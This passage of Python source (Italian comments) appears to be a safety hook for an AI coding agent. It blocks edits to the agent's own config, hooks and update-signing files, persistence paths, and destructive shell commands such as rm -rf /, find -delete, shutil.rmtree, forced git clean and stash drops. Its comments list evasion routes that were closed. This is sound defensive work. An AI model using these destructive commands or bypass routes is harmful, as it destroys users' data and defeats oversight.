def _log_di_job(p):
    """True per la cartella di un job di bin/bgjob.sh (~/.claude/data/logs/bgjobs/<job>):
    log rigenerabili e ignorati da git (3/10/2026). La cartella bgjobs stessa no."""
    bgjobs = os.path.normpath(os.path.join(_home(), ".claude", "data", "logs", "bgjobs"))
    return bool(p) and p.startswith(bgjobs + os.sep)


def _is_protected_tree(p):
    if not p:
        return False
    h = _home()
    claude = os.path.normpath(os.path.join(h, ".claude"))
    base = _projects_base()
    if _log_di_job(p):
        return False
    if p == claude or p.startswith(claude + os.sep):
        return True
    if p == base:
        return True
    if os.path.dirname(p) == base:
        return True
    if p == h or p == os.path.normpath("/"):
        return True
    return False


def _under_claude_config(p):
    """True se il path reale cade su ~/.claude/settings*, ~/.claude/hooks/**, plugins/cache/**,
    plugins/marketplaces/** o .claude.json, oppure
    sull'aggiornamento automatico: la chiave dei rilasci (firme/**) e i due script che la verificano e
    installano. Chi li cambia fa installare da solo codice non firmato (16/10/2026, #3482). Solo qui,
    sul percorso risolto: la regex testuale li vedrebbe anche come sorgente di un cp (/inizio, /aggiorna)."""
    if not p:
        return False
    h = _home()
    radice = os.path.normpath(os.path.join(h, ".claude"))
    # La cache e i marketplace dei plugin installati: col plugin di Arturo il codice delle guardie
    # sta lì, non in ~/.claude/hooks (docs/strati.md, 3/11/2026).
    for cartella in ("hooks", "firme", os.path.join("plugins", "cache"), os.path.join("plugins", "marketplaces")):
        tutta = os.path.join(radice, cartella)
        if p == tutta or p.startswith(tutta + os.sep):
            return True
    if p in (os.path.join(radice, "bin", "aggiornamenti.py"), os.path.join(radice, "bin", "aggiorna-applica.sh")):
        return True
    base = os.path.basename(p)
    if os.path.dirname(p) == os.path.normpath(os.path.join(h, ".claude")):
        if base == ".claude.json" or (base.startswith("settings") and base.endswith(".json")):
            return True
    return False


def _is_persistenza(p):
    """True se il path reale è un git hook o un file di avvio automatico."""
    if not p:
        return False
    if (os.sep + ".git" + os.sep + "hooks" + os.sep) in p or p.endswith(os.sep + ".git" + os.sep + "hooks"):
        return True
    h = _home()
    for radice in ("Library/LaunchAgents", ".config/systemd/user", ".config/autostart"):
        r = os.path.normpath(os.path.join(h, radice))
        if p == r or p.startswith(r + os.sep):
            return True
    return False


def _is_claude_md(p):
    return bool(p) and os.path.basename(p) in ("CLAUDE.md", "CLAUDE.local.md")


def _is_claude_md_globale(p):
    """True per ~/.claude/CLAUDE.md e ~/.claude/CLAUDE.local.md."""
    return _is_claude_md(p) and os.path.dirname(p) == os.path.normpath(os.path.join(_home(), ".claude"))


def _claude_md_progetto_libero():
    """True se hooks/protect_claude_md.local contiene la riga `allow claude-md-progetto`: la stessa
    scelta che protect_claude_md.py applica a Edit e Write (31/10/2026)."""
    try:
        with open(os.path.join(os.path.dirname(os.path.realpath(__file__)), "protect_claude_md.local"),
                  encoding="utf-8") as fh:
            return any(riga.split("#", 1)[0].split() == ["allow", "claude-md-progetto"] for riga in fh)
    except OSError:
        return False


def _is_unlock(p):
    """True per un file di unlock: "unlock" nel nome, direttamente in ~/.claude."""
    return (bool(p) and "unlock" in os.path.basename(p).lower()
            and os.path.dirname(p) == os.path.normpath(os.path.join(_home(), ".claude")))


def _writes_config(command, cwd, protetto=None, sed=True):
    """Copre `cd ~/.claude/hooks && > file` (target relativo dopo un cd): il match
    testuale di CONFIG_WRITE_RE vede solo i path assoluti che contengono `.claude/`.
    Qui si traccia il cd per segmento e si risolve il target reale del redirect/binario.
    `protetto` sceglie cosa si cerca: di default config e hook, oppure _is_claude_md."""
    protetto = protetto or _under_claude_config
    cwd_decl = None
    for seg in re.split(r"&&|\|\||;|\||\n", command):
        seg = seg.strip()
        if not seg:
            continue
        try:
            toks = shlex.split(seg)
        except Exception:
            toks = seg.split()
        if not toks:
            continue
        if toks[0] == "cd" and len(toks) >= 2:
            cwd_decl = _resolve(toks[1], cwd_decl or cwd)
            continue
        base_cwd = cwd_decl or cwd
        # `git log --output=...` scrive quanto una redirezione: non può saltare
        # il controllo soltanto perché il binario si chiama git.
        for index, token in enumerate(toks):
            output = None
            if token.startswith("--output="):
                output = token.partition("=")[2]
            elif token == "--output" and index + 1 < len(toks):
                output = toks[index + 1]
            if output and protetto(_resolve(output, base_cwd)):
                return True
        # redirect > / >> verso un target
        m = re.search(r">>?\s*([^\s'\";|&]+)", seg)
        if m and protetto(_resolve(m.group(1), base_cwd)):
            return True
        # binario di scrittura con un target come argomento
        cmd0 = os.path.basename(toks[0])
        if cmd0 in _WRITE_BINS:
            argomenti = [t for t in toks[1:] if not t.startswith("-")]
            # cp, install, rsync e ln scrivono solo l'ultimo argomento (la sorgente si legge),
            # salvo -t/--target-directory, che sposta la destinazione: allora contano tutti.
            if cmd0 in ("cp", "install", "rsync", "ln") and argomenti and not any(
                    t == "-t" or t.startswith("--target-directory") for t in toks[1:]):
                argomenti = argomenti[-1:]
            for t in argomenti:
                if protetto(_resolve(t, base_cwd)):
                    return True
        # sed -i sul file
        if sed and cmd0 == "sed" and "-i" in seg:
            for t in toks[1:]:
                if not t.startswith("-") and protetto(_resolve(t, base_cwd)):
                    return True
    return False


def _temporaneo(p):
    """True per i path di file temporanei del sistema: /tmp, /private/tmp, /var/folders, $TMPDIR,
    e su Windows %TEMP%, che sta dentro la home. Stessa regola di volatile() in
    bin/inventario-sessione.py: una HOME dentro una cartella temporanea (i banchi) non lo è."""
    # Su Windows normpath scrive `\tmp\prova` e Git Bash `/c/Users`: il confronto si fa con le
    # barre dritte, la lettera del disco e, su Windows, senza maiuscole.
    def dritto(q):
        q = q.replace("\\", "/").rstrip("/")
        if os.name == "nt":
            q = re.sub(r"^/([a-zA-Z])(?=/|$)", r"\1:", q).lower()
        return q

    def sotto(a, b):
        return a == b or a.startswith(b + "/")
    p = dritto(p)
    h = dritto(_home())
    if sotto(h, p):
        return False  # la home, o una cartella che la contiene, non è mai temporanea
    radici = ["/tmp", "/private/tmp", "/var/folders", "/private/var/folders"]
    for nome in ("TMPDIR", "TEMP", "TMP"):
        if os.environ.get(nome, "").strip():
            radici.append(dritto(os.path.normpath(os.environ[nome])))
    for r in radici:
        if r and sotto(p, r):
            if sotto(h, r) and sotto(p, h):
                continue  # i file di una HOME che sta in una cartella temporanea: i banchi
            return True
    return False


def _rigenerabile(p):
    """True se il path è una cartella che si ricrea da sola, o sta dentro una di esse."""
    if _log_di_job(p):
        return True
    parti = p.replace("\\", "/").split("/")
    return any(parte in RIGENERABILI for parte in parti)


def _forma():
    """forma_comando.py della stessa cartella, già caricato in testa al file."""
    return _fc


# Programmi che cancellano file come rm (31/10/2026: unlink e shred passavano da find -exec).
_CANCELLANO = frozenset(("rm", "unlink", "shred"))


# Programmi che ne lanciano un altro: `-exec env rm` cancella come `-exec rm` (1/11/2026, F07).
_INVOLUCRI = frozenset(_fc._WRAPPER | {"timeout", "time", "stdbuf", "ionice", "doas", "chrt", "taskset"})
# Le loro opzioni che prendono un valore staccato (`sudo -u utente`, `nice -n 5`, `timeout -s KILL`).
_INVOLUCRI_CON_VALORE = frozenset(("-u", "-g", "-n", "-p", "-C", "-h", "-U", "-s", "-k", "-c", "-o", "-e", "-i"))


def _dopo_involucri(args):
    """Gli argomenti dal programma vero in poi, saltando wrapper, opzioni, durate e assegnazioni."""
    i = 0
    while i < len(args):
        if os.path.basename(args[i]) in _INVOLUCRI:
            i += 1
            while i < len(args) and (args[i].startswith("-") or re.fullmatch(r"\d+(?:\.\d+)?[smhd]?", args[i])
                                     or _ENV_ASSIGN_RE.match(args[i])):
                i += 2 if args[i] in _INVOLUCRI_CON_VALORE else 1
            continue
        if _ENV_ASSIGN_RE.match(args[i]):
            i += 1
            continue
        break
    return args[i:]


# Le opzioni di xargs che prendono un valore staccato.
_XARGS_CON_VALORE = frozenset(("-I", "-n", "-P", "-L", "-l", "-d", "-E", "-e", "-s", "-a", "--max-args",
                               "--max-procs", "--max-lines", "--delimiter", "--eof", "--max-chars",
                               "--arg-file", "--replace"))


def _xargs_programma(args):
    """Gli argomenti di xargs dal programma che lancia in poi (1/11/2026, F08)."""
    i = 0
    while i < len(args) and args[i].startswith("-") and args[i] != "--":
        i += 2 if args[i] in _XARGS_CON_VALORE else 1
    if i < len(args) and args[i] == "--":
        i += 1
    return args[i:]


def _cancella_dentro(args) -> bool:
    """Vero se gli argomenti di -exec lanciano rm, unlink o shred, anche dietro un wrapper
    (env, sudo, command, nice) o dentro `sh -c '…'`."""
    args = _dopo_involucri(args)
    if not args:
        return False
    nome = os.path.basename(args[0])
    if nome in _CANCELLANO:
        return True
    if nome in _SHELLS and "-c" in args and args.index("-c") + 1 < len(args):
        return any(n in _CANCELLANO for n, _ in _forma().programmi(args[args.index("-c") + 1]))
    return False


def _find_delete(command):
    """`find … -delete`, `find … -exec rm|unlink|shred` (anche dentro `-exec sh -c '…'`) e
    `find … | xargs rm` cancellano quanto un rm ricorsivo."""
    programmi = _forma().programmi(command)
    trova = False
    for nome, args in programmi:
        if nome != "find":
            continue
        trova = True
        if "-delete" in args:
            return True
        for i, t in enumerate(args[:-1]):
            if t in ("-exec", "-execdir", "-ok", "-okdir") and _cancella_dentro(args[i + 1:]):
                return True
    if trova:
        for nome, args in programmi:
            # Conta il programma che xargs lancia: `xargs grep -n rm` non cancella (F08).
            if nome == "xargs" and _cancella_dentro(_xargs_programma(args)):
                return True
    return False


# --- git branch -D e git stash drop (31/10/2026) ---
# Fino al 31/10 li bloccava un deny, che vince anche sulla regola autoMode che li permette quando non si
# perde niente. Ora decide la guardia: tace se il lavoro esiste altrove, altrimenti chiede.


def _git_parti(args):
    """(cartella di -C o None, sottocomando, argomenti dopo il sottocomando) di un `git …`."""
    i, cartella = 0, None
    while i < len(args) and args[i].startswith("-"):
        if args[i] == "-C" and i + 1 < len(args):
            cartella = args[i + 1]
        i += 2 if args[i] in _GIT_OPZIONI_CON_VALORE else 1
    if i >= len(args):
        return cartella, "", []
    return cartella, args[i], args[i + 1:]


def _git_esegui(repo, *argomenti):
    try:
        r = subprocess.run(["git", "-C", repo, *argomenti], capture_output=True, text=True, encoding="utf-8",
                           errors="replace", timeout=5, check=False)
    except (OSError, subprocess.SubprocessError):
        return None
    return r.stdout if r.returncode == 0 else None


def _ramo_altrove(repo, ramo, cancellati=frozenset()) -> bool:
    """Vero se i commit di `ramo` stanno in un ramo remoto o in un altro ramo locale che lo stesso
    comando non cancella. `--contains` riceve il ref pieno: un tag omonimo non lo devia (1/11/2026, F09)."""
    proprio = "refs/heads/" + ramo
    uscita = _git_esegui(repo, "branch", "-a", "--contains", proprio, "--format=%(refname)")
    if uscita is None:
        return False
    esclusi = {proprio} | {"refs/heads/" + r for r in cancellati}
    return any(r.strip() and r.strip() not in esclusi for r in uscita.splitlines())


def _lunga(lunghe, opzione) -> bool:
    """git accetta l'inizio non ambiguo di un'opzione lunga: `--forc` è `--force` (1/11/2026, F13)."""
    return any(len(o.split("=", 1)[0]) >= 3 and opzione.startswith(o.split("=", 1)[0]) for o in lunghe)


def _branch_cancella(resto):
    """(forzato, rami) di un `git branch …`: forzato se -D, -d -f, --delete --force o i loro prefissi."""
    corte = "".join(a[1:] for a in resto if a.startswith("-") and not a.startswith("--"))
    lunghe = [a for a in resto if a.startswith("--")]
    cancella = "d" in corte or "D" in corte or _lunga(lunghe, "--delete")
    forza = "D" in corte or (cancella and ("f" in corte or _lunga(lunghe, "--force")))
    return forza, [a for a in resto if not a.startswith("-")]


def _stash_ref(args):
    """La chiave dello stash nominato negli argomenti: `stash@{N}` o `N` danno N, nessuno dà 0."""
    for a in args:
        if a.startswith("-"):
            continue
        m = re.fullmatch(r"stash@\{(\d+)\}|(\d+)", a)
        if m:
            return int(m.group(1) or m.group(2))
        return a  # un ref che non è uno stash numerato: chiave a sé
    return 0


def _senza_redirezioni(args):
    """Gli argomenti senza le redirezioni (`> f`, `>f`, `2>/dev/null`) e il loro bersaglio."""
    fuori, salta = [], False
    for a in args:
        if salta:
            salta = False
        elif _REDIREZIONE_SOLA_RE.match(a):
            salta = True
        elif not _REDIREZIONE_RE.match(a):
            fuori.append(a)
    return fuori


def _git_perde_lavoro(command, cwd):
    """(regola, motivo) se il comando cancella un ramo con commit che non stanno altrove, o uno stash
    che lo stesso comando non salva prima. None se non perde niente.

    Uno stash conta come salvato solo se lo stesso comando ne scrive la patch su un file
    (`git stash show -p [ref] > file`) o lo tagga (`git tag nome stash@{N}`), e solo per quel ref
    (1/11/2026, F11 F12). `git stash branch` toglie già da solo lo stash che applica: il drop che segue
    ne butta un altro (F37). `git stash clear` li butta tutti. I rami cancellati dallo stesso comando
    non si coprono a vicenda (F10)."""
    programmi = list(_programmi_con_cd(command))
    cancellati = set()
    for nome, args, _cds in programmi:
        if nome == "git":
            _c, sotto, resto = _git_parti(args)
            if sotto == "branch":
                forza, rami = _branch_cancella(resto)
                if forza:
                    cancellati.update(rami)
    salvati = set()
    for nome, args, cds in programmi:
        if nome != "git":
            continue
        cartella, sotto, resto = _git_parti(args)
        if sotto == "tag":
            nomi = [a for a in _senza_redirezioni(resto) if not a.startswith("-")]
            elenca = any(a in ("-l", "--list", "-d", "--delete", "-v", "--verify") for a in resto)
            if not elenca and len(nomi) >= 2 and re.fullmatch(r"stash@\{\d+\}", nomi[1]):
                salvati.add(_stash_ref(nomi[1:2]))
            continue
        if sotto == "stash" and resto[:1] == ["show"]:
            patch = any(a in ("-p", "--patch") or (re.match(r"^-[A-Za-z]+$", a) and "p" in a) for a in resto[1:])
            destinazioni = []
            for i, a in enumerate(resto):
                m = re.match(r"^1?>>?(.*)$", a)
                if m:
                    destinazioni.append(m.group(1) or (resto[i + 1] if i + 1 < len(resto) else ""))
            if patch and any(x and x != "/dev/null" for x in destinazioni):
                salvati.add(_stash_ref(_senza_redirezioni(resto[1:])))
            continue
        if sotto == "stash" and resto[:1] == ["clear"]:
            return ("git-stash", "git stash clear cancella tutti gli stash: le modifiche dentro non stanno in "
                    "nessun commit. Salvali prima con `git stash show -p stash@{N} > file.patch`, oppure conferma.")
        if sotto == "stash" and resto[:1] == ["drop"]:
            ref = _stash_ref(_senza_redirezioni(resto[1:]))
            if ref not in salvati:
                return ("git-stash", "git stash drop cancella uno stash che lo stesso comando non salva prima: "
                        "le modifiche dentro non stanno in nessun commit. Salvalo prima con "
                        "`git stash show -p stash@{N} > file.patch` (lo stesso stash del drop), oppure conferma.")
            # Dopo il drop gli stash sotto salgono di un posto: stash@{1} diventa stash@{0} (review del 1/11).
            salvati.discard(ref)
            if isinstance(ref, int):
                salvati = {k - 1 if isinstance(k, int) and k > ref else k for k in salvati}
            continue
        if sotto != "branch":
            continue
        forza, rami = _branch_cancella(resto)
        if not forza:
            continue
        basi = _basi_dopo_cd(cds, cwd)
        if len(basi) != 1 or basi[0] is None:
            repo = None
        else:
            repo = _resolve(cartella, basi[0]) if cartella else basi[0]
        for ramo in rami:
            if repo is None or not _ramo_altrove(repo, ramo, cancellati):
                return ("git-ramo", f"git branch -D cancella il ramo {ramo}, e i suoi commit non stanno in un ramo "
                        "remoto né in un altro ramo locale che resta: si perderebbero. Conferma solo se non ti servono.")
    return None


# --- git commit --amend sul commit di un'altra sessione (3/11/2026, #4187, segnalazione n. 25) ---
# Due sessioni sullo stesso repository: fra il commit di A e il suo `--amend` per un refuso, B aveva fatto
# un commit, e l'amend ha riscritto quello di B. Il modo `dopo` (PostToolUse di Bash) registra per
# sessione l'HEAD lasciato da ogni `git commit`; prima di un amend, un HEAD che la sessione non ha
# registrato chiede conferma. Nel dubbio (sessione senza id, repository illeggibile) chiede.
_SESSIONE_RE = re.compile(r"^[A-Za-z0-9_-]{1,80}$")
_REGISTRO_MAX = 50


def _registro_percorso(sessione):
    if not isinstance(sessione, str) or not _SESSIONE_RE.match(sessione):
        return None
    return os.path.join(_home(), ".claude", "session-env", f"commit-{sessione}.json")


def _registro_leggi(percorso):
    try:
        with open(percorso, encoding="utf-8") as f:
            dati = json.load(f)
    except (OSError, ValueError):
        return {}
    return dati if isinstance(dati, dict) else {}


def _commit_del_comando(command, cwd):
    """[(repository o None, amend)] per ogni `git … commit` del comando, nell'ordine. None se la
    cartella non è una sola o se --git-dir/--work-tree la spostano."""
    out = []
    for nome, args, cds in _programmi_con_cd(command):
        if nome != "git":
            continue
        cartella, sotto, resto = _git_parti(args)
        if sotto != "commit":
            continue
        amend = _lunga([a for a in resto if a.startswith("--")], "--amend")
        basi = _basi_dopo_cd(cds, cwd)
        if any(a.split("=", 1)[0] in ("--git-dir", "--work-tree") for a in args):
            repo = None
        elif len(basi) != 1 or basi[0] is None:
            repo = None
        else:
            repo = _resolve(cartella, basi[0]) if cartella else basi[0]
        out.append((repo, amend))
    return out


def _testa(repo):
    """(radice del repository, sha di HEAD) oppure None."""
    uscita = _git_esegui(repo, "rev-parse", "--show-toplevel", "HEAD")
    righe = uscita.splitlines() if uscita else []
    if len(righe) != 2:
        return None
    return os.path.normcase(os.path.normpath(righe[0])), righe[1].strip()


def registra_commit(data) -> int:
    """Modo `dopo`: scrive nel registro della sessione l'HEAD dei repository dove il comando ha fatto un commit."""
    percorso = _registro_percorso(data.get("session_id"))
    command = (data.get("tool_input") or {}).get("command", "")
    if not percorso or not isinstance(command, str) or "commit" not in command:
        return 0
    registro = None
    for repo, _amend in _commit_del_comando(command, data.get("cwd") or _home()):
        testa = _testa(repo) if repo else None
        if not testa:
            continue
        if registro is None:
            registro = _registro_leggi(percorso)
        voci = [s for s in registro.get(testa[0], []) if isinstance(s, str) and s != testa[1]]
        registro[testa[0]] = (voci + [testa[1]])[-_REGISTRO_MAX:]
    if registro is not None:
        os.makedirs(os.path.dirname(percorso), exist_ok=True)
        provvisorio = f"{percorso}.{os.getpid()}"
        with open(provvisorio, "w", encoding="utf-8") as f:
            json.dump(registro, f)
        os.replace(provvisorio, percorso)
    return 0


def _amend_altrui(command, cwd, sessione):
    """Il motivo della conferma se un `git commit --amend` del comando riscrive un HEAD che questa sessione
    non ha registrato, None se no. Un commit senza amend prima, nello stesso comando e repository, è suo."""
    commit = _commit_del_comando(command, cwd)
    if not any(amend for _r, amend in commit):
        return None
    percorso = _registro_percorso(sessione)
    registro = _registro_leggi(percorso) if percorso else {}
    fatti = set()
    for repo, amend in commit:
        if not amend:
            if repo:
                fatti.add(repo)
            continue
        if repo in fatti:
            continue
        testa = _testa(repo) if repo else None
        if not testa:
            return ("git commit --amend su un repository che la guardia non riesce a leggere: se un'altra "
                    "sessione ha fatto un commit nel frattempo, l'amend riscrive il suo. Controlla con "
                    "`git log -1` prima di confermare.")
        if testa[1] not in registro.get(testa[0], []):
            ultimo = (_git_esegui(repo, "log", "-1", "--format=%h %s") or testa[1][:7]).strip()[:90]
            return (f"L'ultimo commit ({ultimo}) non l'ha fatto questa sessione: se un'altra sessione ha fatto "
                    "un commit nel frattempo, l'amend riscrive il suo. Per un refuso nel messaggio lascialo "
                    "stare. Conferma solo se il commit è tuo.")
    return None


# shutil.rmtree cancella una cartella intera come `rm -r`, ma da dentro python (17/10/2026, #3506).
_RMTREE_RE = re.compile(r"\b(?:shutil\.)?rmtree\s*\(\s*(?:(['\"])([^'\"]*)\1|([A-Za-z_]\w*)\s*\))?")
# `py` è il lanciatore di python su Windows (20/10/2026, #3525: `py -c "...rmtree..."` passava).
_PYTHON_RE = re.compile(r"(?:^|[\s;&|(/])(?:python3?(?:\.\d+)?|py)(?=\s|$)")
_RMTREE_ALIAS_RE = re.compile(r"\brmtree\s+as\s+([A-Za-z_]\w*)")
_TEMPORANEA = "<cartella di tempfile>"


def _rmtree_bersagli(command):
    """I bersagli di shutil.rmtree nel codice python del comando: il percorso scritto, o None se il
    percorso arriva da una variabile. Il corpo di un heredoc che va a un lettore (cat, tee) non conta."""
    testo = _hd.togli(command, lambda h: h.quotato and h.inerte())
    if "rmtree" not in testo or "shutil" not in testo or not _PYTHON_RE.search(testo):
        return []
    # `from shutil import rmtree as r` e poi `r(...)`: l'alias cancella come rmtree (20/10/2026, #3525).
    for alias in _RMTREE_ALIAS_RE.findall(testo):
        testo += "\n" + re.sub(r"\b" + re.escape(alias) + r"\s*\(", "rmtree(", testo)
    bersagli = []
    for m in _RMTREE_RE.finditer(testo):
        if m.group(1):
            bersagli.append(m.group(2))
        elif m.group(3) and re.search(r"\b" + re.escape(m.group(3)) + r"\s*=\s*tempfile\.mkdtemp\s*\(", testo):
            bersagli.append(_TEMPORANEA)  # una cartella appena creata da tempfile: è temporanea
        else:
            bersagli.append(None)
    return bersagli


# Le opzioni di git prima del sottocomando che prendono un valore staccato.
_GIT_OPZIONI_CON_VALORE = frozenset(("-C", "-c", "--git-dir", "--work-tree", "--namespace", "--exec-path",
                                     "--config-env", "--super-prefix"))


def _git_clean_forzato(command):
    """`git clean` con -f o --force e senza -n/--dry-run, anche con opzioni di git in mezzo
    (`git -C dir clean -fdx`). Cancella i file non tracciati: git non li sa ridare."""
    for nome, args in _forma().programmi(command):
        if nome != "git":
            continue
        i, senza_obbligo = 0, False
        while i < len(args) and args[i].startswith("-"):
            # `git -c clean.requireForce=false clean` cancella anche senza -f (20/10/2026, #3525).
            if args[i] == "-c" and i + 1 < len(args) and \
                    args[i + 1].replace(" ", "").lower() in ("clean.requireforce=false", "clean.requireforce=0",
                                                             "clean.requireforce=no", "clean.requireforce=off"):
                senza_obbligo = True
            i += 2 if args[i] in _GIT_OPZIONI_CON_VALORE else 1
        if i >= len(args) or args[i] != "clean":
            continue
        corte, lunghe = "", []
        resto = args[i + 1:]
        k = 0
        while k < len(resto):
            a = resto[k]
            if a == "--":
                break
            if a.startswith("--"):
                lunghe.append(a.split("=", 1)[0])
                if a in ("--exclude",):
                    k += 1  # il valore staccato di --exclude non è un'opzione
            elif a.startswith("-"):
                # -e prende un valore attaccato o staccato: `-enode_modules` non contiene un -n.
                gruppo = a[1:]
                if "e" in gruppo:
                    corte += gruppo[:gruppo.index("e")]
                    if gruppo.endswith("e"):
                        k += 1
                else:
                    corte += gruppo
            k += 1
        # git accetta l'inizio di un'opzione lunga se non è ambiguo: `--forc` è `--force`.
        forza = "f" in corte or any(len(o) > 2 and "--force".startswith(o) for o in lunghe) or senza_obbligo
        prova = "n" in corte or any(len(o) > 2 and "--dry-run".startswith(o) for o in lunghe)
        if forza and not prova:
            return True
    return False


_REDIREZIONE_RE = re.compile(r"^(?:\d*|&)(?:>>?|<)")
_REDIREZIONE_SOLA_RE = re.compile(r"^(?:\d*|&)(?:>>?|<)$")


_CAMBIA_CARTELLA = frozenset(("cd", "pushd", "popd"))
_CD_RIDEFINITO = re.compile(r"(?:^|[;&|\s(])(?:function\s+)?(?:cd|pushd|popd)\s*\(\s*\)"
                            r"|\bfunction\s+(?:cd|pushd|popd)\b|\balias\s+(?:cd|pushd|popd)=")
_APRE_BLOCCO = frozenset("if while until for case select".split())
_CHIUDE_BLOCCO = frozenset("fi done esac".split())
_OPERATORI = re.compile(r"&&|\|\||;;|\|&|[;&|()\n]")


def _cd_certi(command, profondita=0, forzato=False):
    """Per ogni cd, pushd e popd del comando, nell'ordine di forma_comando.programmi: True se gira di
    sicuro nella shell dei comandi che lo seguono (31/10/2026).

    Non è sicuro un cd in ( ), in $( ) o <( ), fra backtick, in un blocco { } o nel corpo di una
    funzione, in un ramo di if/while/until/for/case/select, dentro sh -c o eval, dopo `||` o `|`,
    dopo `&&` preceduto da un altro comando, o seguito da `&`, `|` o `||`. Le parole si leggono come
    in forma_comando: stesso testo (testo_shell) e stessi confini."""
    forma = _forma()
    try:
        lexer = shlex.shlex(forma.testo_shell(command), posix=True, punctuation_chars=";&|()\n")
        lexer.whitespace = " \t\r"
        lexer.whitespace_split = True
        gettoni = list(lexer)
    except ValueError:
        return []  # forma_comando ricade su uno split semplice: il conteggio non torna, e ogni cd è incerto
    out = []
    pila = []          # "sub", "subst", "kw", "graffa"
    backtick = False
    parole = []        # il comando semplice in corso
    prima = None       # l'operatore prima del comando
    indice = 0         # posizione del comando nella lista && / ||
    precedente = None  # l'ultimo gettone visto

    def chiudi(dopo):
        nonlocal parole, prima, indice
        if parole:
            i = 0
            while i < len(parole) and (parole[i] in forma._DAVANTI or forma._ASSEGNAZIONE.match(parole[i])
                                       or forma._nome(parole[i]) in forma._WRAPPER):
                i += 1
            nome = forma._nome(parole[i]) if i < len(parole) else ""
            args = parole[i + 1:]
            if nome in _CAMBIA_CARTELLA:
                out.append(not (forzato or pila or backtick) and prima in (None, ";", "\n", "&", ";;")
                           and indice == 0 and dopo not in ("|", "|&", "&", "||"))
            if profondita < 3:
                if nome in forma.SHELL and "-c" in args and args.index("-c") + 1 < len(args):
                    out.extend(_cd_certi(args[args.index("-c") + 1], profondita + 1, True))
                elif nome == "eval" and args:
                    out.extend(_cd_certi(" ".join(args), profondita + 1, True))
        parole = []
        if dopo in ("&&", "||"):
            indice += 1
        elif dopo is not None:
            indice = 0
        prima = dopo

    for g in gettoni:
        if g and set(g) <= set(";&|()\n"):
            for op in _OPERATORI.findall(g):
                if op == "(":
                    if parole and parole[-1].endswith(("$", "<", ">")):
                        chiudi(None)
                        pila.append("subst")
                    elif parole and precedente not in (None, "(") and not set(precedente) <= set(";&|()\n"):
                        pila.append("funz")  # `f() {`: le parentesi della definizione
                    else:
                        chiudi(None)
                        pila.append("sub")
                elif op == ")":
                    if pila and pila[-1] == "funz":
                        pila.pop()
                        chiudi(None)
                        pila.append("graffa-funz")
                    elif pila and pila[-1] in ("sub", "subst"):
                        chiudi(None)
                        pila.pop()
                    else:
                        chiudi(None)  # il pattern di un case
                else:
                    chiudi(op)
                precedente = op
            continue
        if g.count("`") % 2:
            backtick = not backtick
        if all(p in forma._DAVANTI for p in parole):  # posizione di comando, anche dopo then, do, {
            if g in _APRE_BLOCCO:
                pila.append("kw")
            elif g in _CHIUDE_BLOCCO and "kw" in pila:
                del pila[len(pila) - 1 - pila[::-1].index("kw")]
            elif g == "{":
                if pila and pila[-1] == "graffa-funz":
                    pila[-1] = "graffa"
                else:
                    pila.append("graffa")
            elif g == "}" and "graffa" in pila:
                del pila[len(pila) - 1 - pila[::-1].index("graffa")]
        parole.append(g)
        precedente = g
    chiudi(None)
    return out


def _programmi_con_cd(command):
    """(programma, argomenti, catena dei cd prima di lui) per ogni comando che non è cd, pushd o popd.

    Ogni voce della catena è (cartella o None, certo): None per popd, `cd -`, `cd -P x`, `pushd +1`;
    certo viene da _cd_certi. Se le due letture non contano gli stessi cd, ogni cd vale come incerto."""
    out = []
    cds = []
    programmi = _forma().programmi(command)
    certi = _cd_certi(command)
    if len(certi) != sum(1 for nome, _ in programmi if nome in _CAMBIA_CARTELLA):
        certi = None
    # Un CR senza LF dopo separa le parole per il lexer ma non per bash e zsh (`cd /tmp\r` cerca la
    # cartella "/tmp\r"), e un cd ridefinito come funzione o alias non cambia cartella: ogni cd è
    # incerto (1/11/2026, F14 F15).
    if re.search(r"\r(?!\n)", command) or _CD_RIDEFINITO.search(command):
        certi = None
    for nome, args in programmi:
        if nome in _CAMBIA_CARTELLA:
            certo = bool(certi and certi[len(cds)])
            if nome == "popd" or (args and (args[0].startswith(("-", "+")) and args[0] != "--")):
                dest = None
            else:
                resto = args[1:] if args and args[0] == "--" else args
                dest = resto[0] if resto else ("~" if nome == "cd" else None)  # `cd` da solo va nella home
                if len(_senza_redirezioni(resto)) > 1:
                    certo = False  # `cd /tmp foo`: "too many arguments", resta dov'era (F15)
            cds.append((dest, certo))
            continue
        out.append((nome, args, tuple(cds)))
    return out


def _reale(p):
    """Il percorso con i link risolti nella parte che esiste già (1/11/2026, F18): `/tmp/xx/*` con
    /tmp/xx link ai progetti è la cartella dei progetti. Un glob resta in coda, come scritto."""
    if p is None:
        return None
    testa, coda = p, []
    while testa and not os.path.lexists(testa):
        su, nome = os.path.split(testa)
        if su == testa:
            return p
        coda.insert(0, nome)
        testa = su
    try:
        vero = os.path.realpath(testa)
        # Nessun link sul percorso: resta com'è scritto. Su Windows realpath trasforma anche `/tmp` in
        # `C:\tmp`, che non è il temporaneo che la shell intende.
        if os.path.normcase(vero) == os.path.normcase(os.path.normpath(os.path.abspath(testa))):
            return p
        reale = os.path.normpath(os.path.join(vero, *coda))
        # Su macOS realpath porta /var e /tmp sotto /private: la home e i progetti tornano nella forma con
        # cui li conoscono le regole (RV02 rosso su macOS il 1/11/2026, verde su Windows senza link).
        casa = os.path.normpath(_home())
        casa_vera = os.path.realpath(casa)
        if casa_vera != casa and (reale == casa_vera or reale.startswith(casa_vera + os.sep)):
            reale = casa + reale[len(casa_vera):]
        return reale
    except (OSError, ValueError):
        return p


def _sotto_link_nuovo(p, command, cwd):
    """Vero se `p` sta sotto un link che lo stesso comando crea con `ln -s`: il link non esiste ancora
    quando la guardia gira, e realpath non lo vede."""
    for nome, args in _forma().programmi(command):
        if nome != "ln":
            continue
        if not any(a == "--symbolic" or (a.startswith("-") and not a.startswith("--") and "s" in a) for a in args):
            continue
        posizionali = [a for a in _senza_redirezioni(args) if not a.startswith("-")]
        if len(posizionali) < 2:
            continue
        link = _resolve(posizionali[-1], os.path.normpath(cwd))
        if link and (p == link or p.startswith(link.rstrip("/\\") + os.sep) or p.startswith(link.rstrip("/") + "/")):
            return True
    return False


# La radice, la home intera e il disco intero (1/11/2026, F33 F35 e review delle correzioni): si giudicano
# sui programmi del comando, non sul testo, così `grep -n "rm -rf /" f` e "Format A:" in una stringa tacciono.
_RADICE_RM = re.compile(r"^(?:/|~/?|\$HOME/?|\$\{HOME\}/?)\*?$")
_DISCO_DEL = re.compile(r"^[a-zA-Z]:[\\/]*(?:\*(?:\.\*)?)?$")
_DISCO_RD = re.compile(r"^[a-zA-Z]:[\\/]*$")


def _distruzione_totale(command, profondita=0):
    """Il motivo del blocco se il comando cancella la radice, la home o un disco intero; None altrimenti."""
